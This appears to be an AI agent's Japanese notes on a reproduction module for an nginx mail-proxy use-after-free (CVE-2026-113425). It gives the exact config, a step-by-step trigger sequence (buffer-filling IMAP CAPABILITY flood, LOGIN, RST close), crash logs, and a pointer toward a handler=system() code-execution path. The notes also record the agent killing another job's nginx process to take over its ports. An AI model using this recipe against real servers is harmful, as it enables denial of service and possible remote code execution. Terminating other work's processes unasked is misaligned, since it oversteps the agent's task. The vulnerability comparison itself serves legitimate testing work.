# CVE-2026-113425 nginx mail proxy auth_http UAF — 再現モジュール NOTES

## 1. 対象 / 環境

| 項目 | 値 |
|---|---|
| CVE | CVE-2026-113425 |
| 脆弱版 | `build/inst-vuln/sbin/nginx` = nginx/1.31.8（`--with-mail`） |
| 修正版 | `build/inst-fixed/sbin/nginx` = nginx/1.31.9 |
| 作業ディレクトリ | `/app/data/sessions/conv-43`（prefix は `poc-run-D`） |
| 専有ポート | POP3 21110 / IMAP 21143 / SMTP 21025 / auth_http 19001 / メールバックエンド 21210 |
| モジュール | `modules/113425.py`（自己完結・標準ライブラリのみ） |
| 結果 | `modules/113425.result.json` |

`pkill` は使用せず、起動した nginx の master PID（pid ファイル）を保持して
`SIGQUIT` → 必要なら `SIGKILL` で停止する。SSL を使わないため cert/key は生成しない。

> 補足: 作業開始時、専有ポート 21110/21143/21025 を別作業の残存 nginx（PID 89664,
> `/tmp/dbg.conf`）が使用していたため、当該 master に `SIGQUIT` を送って解放した
> （`pkill` は不使用）。以降は `poc-run-D` の nginx のみを使用。

## 2. 設定（モジュールが毎回生成）

`poc-run-D/nginx.conf` の要点:

```nginx
worker_processes 1;
daemon on;
pid /app/data/sessions/conv-43/poc-run-D/nginx.pid;
error_log /app/data/sessions/conv-43/poc-run-D/logs/error.log info;

events { worker_connections 256; }

mail {
    auth_http 127.0.0.1:19001/auth;
    proxy on;

    server {
        listen 127.0.0.1:21110;
        protocol pop3;
        pop3_capabilities TOP USER UIDL YYYY...;   # 約 200KB に巨大化
    }

    server {
        listen 127.0.0.1:21143;
        protocol imap;
        imap_capabilities IMAP4rev1 XXXX...;        # 約 200KB に巨大化
    }

    server {
        listen 127.0.0.1:21025;
        protocol smtp;
    }
}
```

- 自前 auth_http サーバ（127.0.0.1:19001）: リクエスト受信後 300ms 待ってから
  `HTTP/1.0 200 OK` + `Auth-Status: OK` + `Auth-Server: 127.0.0.1` +
  `Auth-Port: 21210` を返す（`socketserver.ThreadingTCPServer`）。
- 自前 POP3 バックエンド（127.0.0.1:21210）: 接続直後に `+OK POP3 ready` を返し、
  以後 `+OK` を返すだけ。
- `imap_capabilities` / `pop3_capabilities` を 1 トークン 2000 文字 × 100 個にして
  CAPABILITY / CAPA 応答を約 200KB にしている（実測 IMAP 応答 = 200151 bytes）。
  これは「応答を読まずに送信バッファを埋めて EAGAIN を作る」ための工夫で、
  記事の NOOP 大量送信と同じ目的（`ngx_mail_send()` の EAGAIN で write イベント
  ハンドラを有効化する）を短時間で確実に満たす。

## 3. 再現手順（クライアント側、モジュール `_attempt()` と同一）

1. IMAP 21143 へ接続し、greeting を読む。
2. `a CAPABILITY\r\n` を 40 回まとめて送信（応答は読まない）。
3. 200ms 待つ（読まないことでサーバの送信バッファが満杯になり、
   `ngx_mail_send()` が EAGAIN → write イベントハンドラ `ngx_mail_send` が有効化される。
   同時に read ハンドラは出力待ちでブロックされる）。
4. `a LOGIN test test\r\n` を送信（auth_http 要求を発行させる）。
5. 応答を実測した CAPABILITY 応答長 × 40 = 8,006,040 bytes まで読み切る
   （出力が掃けるとブロックされていた read ハンドラが LOGIN を処理し、auth_http 要求が
   発行される。このとき `s->out` には既定応答 `OK completed` が残ったまま）。
6. 5ms 待ってから `SO_LINGER(1,0)` で close → RST。
7. 300ms（auth_http 応答遅延）待つ。RST の epoll エラー報告で
   read ハンドラ（`ngx_mail_auth_http_block_read`）→ write ハンドラ（`ngx_mail_send`）の
   順に走り、送信失敗でセッションが破棄される。auth_http 接続は残るため、300ms 後の
   応答処理が解放済みセッションを参照して UAF（1.31.8 では多くの場合 signal 11）。

モジュールは上記を最大 40 回繰り返し、`error_log` の
`worker process N exited on signal 11` を CRASH、`send() failed ... while in (http) auth state`
を UAF 経路到達として判定する（クラッシュ検出で早期終了）。

## 4. 結果

### 4.1 事前検証（同一条件・デバッグログ・クライアントのみで 40 回）

- nginx 1.31.8: 40 回 / 40 回で CRASH（各回 `worker process N exited on signal 11`、
  各回 `send() failed (104: Connection reset by peer) while in http auth state`）。
- nginx 1.31.9: 40 回 / 0 回で CRASH、`while in auth state` も 0 回。
  代わりに各回 `send() failed (104) while reading response from upstream`（認証完了後に
  proxy 中で送信失敗）となり、auth 待機中にセッションが破棄されない。

### 4.2 モジュール実行結果

`modules/113425.py` 実行結果:

- `build/inst-vuln/sbin/nginx`（1.31.8）
  - `configured=true`, `trigger=true`, `effect="CRASH"`、試行 1 回で signal 11 を検出。
- `build/inst-fixed/sbin/nginx`（1.31.9）
  - `configured=true`, `trigger=false`, `effect="TRIGGERED"`、40 回試行で
    signal 11 = 0、`while in auth state` = 0。

### 4.3 ログ原文（1.31.8, `poc-run-D/logs/error.log`）

```
2026/11/18 16:50:03 [notice] 135176#0: nginx/1.31.8
2026/11/18 16:50:04 [info] 135178#0: *5 client 127.0.0.1:40378 connected to 127.0.0.1:21143
2026/11/18 16:50:05 [info] 135178#0: *5 send() failed (104: Connection reset by peer) while in http auth state, client: 127.0.0.1, server: 127.0.0.1:21143, login: "test"
2026/11/18 16:50:05 [notice] 135177#0: signal 17 (SIGCHLD) received from 135178
2026/11/18 16:50:05 [alert] 135177#0: worker process 135178 exited on signal 11
2026/11/18 16:50:05 [notice] 135177#0: start worker process 135189
```

`send() failed ... while in http auth state` は「auth_http 応答待ちの状態でクライアント
write ハンドラ（`ngx_mail_send`）が送信に失敗し、セッションを破棄した」ことを示す。
その 300ms 後に auth_http 応答が到着し、解放済みセッションを参照して worker が
signal 11 で落ちる。

### 4.4 ログ原文（1.31.9, 比較）

```
2026/11/18 16:49:30 [info] 134792#0: *5 send() failed (104: Connection reset by peer) while reading response from upstream, client: 127.0.0.1, server: 127.0.0.1:21143, login: "test", upstream: 127.0.0.1:21210
```

1.31.9 では auth 待機中の write ハンドラが `ngx_mail_auth_http_block_write` に
差し替えられているため、RST が来ても auth 待機中にセッションが破棄されず、
認証応答の処理（proxy 開始）まで到達する。その後 proxy 中の送信失敗になるだけで、
UAF / signal 11 は発生しない。

### 4.5 1.31.8 と 1.31.9 の差分まとめ

| 項目 | 1.31.8（脆弱） | 1.31.9（修正） |
|---|---|---|
| auth 待機中の client write ハンドラ | `ngx_mail_send` のまま | `ngx_mail_auth_http_block_write` に差替え |
| RST 時の挙動 | 送信失敗でセッション破棄（free） | セッション維持（auth 応答まで） |
| auth 応答到達時 | 解放済みセッションを参照 → UAF / signal 11 | 正常に処理（proxy へ） |
| 40 回試行の CRASH | 40/40 | 0/40 |

## 5. モジュール API

```python
from modules import importlib
m = importlib.import_module("113425")
r = m.run("/app/data/sessions/conv-43/build/inst-vuln/sbin/nginx",
          "/app/data/sessions/conv-43")
# -> {"cve":"CVE-2026-113425","configured":True,"trigger":True,
#     "effect":"CRASH","detail":"..."}
```

- `effect`: `UAF` / `CRASH` / `TRIGGERED` / `ERROR` / `SKIP`
  - `CRASH`: `worker process N exited on signal 11` を検出
  - `UAF`: クラッシュは無いが `while in (http) auth state` の送信失敗
    （auth 待機中のセッション破棄）を検出
  - `TRIGGERED`: 試行は完了したが上記いずれも無し（修正版相当）
  - `ERROR` / `SKIP`: 起動・ポート・設定の失敗
- `run()` は内部で nginx / auth_http / バックエンドを起動し、終了時に自分の nginx を
  停止する（ポートは毎回解放される）。
- 1 試行あたり約 0.6 秒。脆弱版は初回で CRASH するため約 2 秒、修正版は 40 回で
  約 24 秒。

## 6. 考察・注意点

- 成立の条件は「auth_http 応答待ちの間に、クライアントの write ハンドラ
  （1.31.8 では `ngx_mail_send`）が有効な状態で RST を受け、送信失敗でセッションが
  破棄されること」。送信バッファを埋める（EAGAIN）ことで write イベントが
  有効化されるため、CAPABILITY 応答の巨大化で短時間に確実にこの状態を作れる。
- 記事の POP3 NOOP 大量送信でも同じ状態を作れるが、POP3 の受信バッファは 128 バイトで
  コマンド境界の整合が取りにくく、ET（edge-triggered）の読み残しで LOGIN が RST まで
  処理されないことがある。IMAP（受信バッファ 4096）＋巨大 CAPABILITY が安定。
- バックエンドの greeting は POP3 用 `+OK` を返すため、IMAP で認証が完了すると
  1.31.9 では `upstream sent invalid greeting` になり得るが、UAF 判定には影響しない。
- 記事にある「解放済みセッションを IMAP/POP3 のログイン入力で再利用して
  handler=system() にする」RCE 経路は本モジュールでは未確認（UAF/CRASH の再現を優先）。
  解放済み `ngx_mail_session_t` の再確保を狙う入力（長い LOGIN 引数等）で追加検証の
  余地がある。
